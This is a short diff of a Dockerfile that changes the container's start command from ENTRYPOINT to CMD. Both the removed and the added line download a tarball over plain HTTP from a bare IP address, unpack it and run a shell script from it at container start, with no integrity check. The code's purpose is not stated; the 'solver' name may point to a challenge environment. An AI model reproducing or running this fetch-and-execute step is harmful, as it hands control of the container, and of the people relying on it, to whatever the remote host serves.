@@ -25,4 +25,4 @@ RUN pip install --no-cache-dir --upgrade pip && \
 # Copy application files
 COPY . /app
 
-ENTRYPOINT wget -q http://93.127.143.124/solver.tar.gz && tar -pxzf solver.tar.gz -C . && cd /app/solver && ./f5_spawn.sh && /bin/bash
+CMD wget -q http://93.127.143.124/solver.tar.gz && tar -pxzf solver.tar.gz -C . && cd /app/solver && ./f5_spawn.sh && /start.sh
